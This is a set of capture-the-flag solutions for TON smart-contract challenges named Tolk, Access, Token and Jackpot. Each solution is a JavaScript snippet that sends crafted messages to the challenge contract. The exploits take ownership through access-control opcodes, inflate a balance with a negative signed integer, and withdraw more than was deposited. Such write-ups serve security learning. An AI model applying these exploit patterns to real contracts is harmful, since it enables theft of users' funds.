## 11. Tolk

<details>
  <summary>Solution</summary>

```js
await contract.send(player, beginCell().storeUint(0xf0fd50bb, 32).endCell(), toNano('0.03'));
```

</details>

## 13. Access

Solved similarly to [this](https://github.com/mysteryon88/ton-ctfs/tree/main/hack-challenge-1/contracts/1.%20mutual%20fund) assignment

<details>
  <summary>Solution</summary>

```js
await contract.send(player, beginCell().storeUint(0x8caa87bd, 32).storeUint(9999, 32).endCell(), toNano('0.03'));

await contract.send(
    player,
    beginCell()
        .storeUint(0xf1eef33c, 32)
        .storeAddress(Address.parse('0QCfWnJsn6EObZIpyynLFgEI__C5qX4l_WsiaokAZuDW7bT2'))
        .endCell(),
    toNano('0.03'),
);

await contract.send(player, beginCell().storeUint(0xf0fd50bb, 32).endCell(), toNano('0.03'));
```

</details>

## 17. Token

Use of signed and unsigned numbers

<details>
  <summary>Solution</summary>

```js
await contract.getTotalSupply();
await contract.getBalanceOf(Address.parse('EQBRJB8v2jm0srC5LNYNedch8wR35KPsqt23TSwM9R2jFgSP')); // = 1000000n

await contract.send(
    player,
    beginCell()
        .storeUint(0x3ee943f1, 32)
        .storeAddress(Address.parse('EQBRJB8v2jm0srC5LNYNedch8wR35KPsqt23TSwM9R2jFgSP'))
        .storeInt(-1000000n, 256)
        .endCell(),
    toNano('0.03'),
);
```

  </details>

## 18. Jackpot

Solved similarly to [this](https://github.com/mysteryon88/ton-ctfs/tree/main/hack-challenge-1/contracts/2.%20bank) assignment

<details>
  <summary>Solution</summary>

Always check for modifying/non-modifying methods.

```js
// deposit
await contract.send(player, beginCell().storeUint(0, 32).endCell(), toNano('0.03'));

// withdraw
await contract.send(player, beginCell().storeUint(1, 32).storeCoins(toNano('0.02')).endCell(), toNano('0.03'));
await contract.send(player, beginCell().storeUint(1, 32).storeCoins(toNano('0.02')).endCell(), toNano('0.03'));
```

  </details>
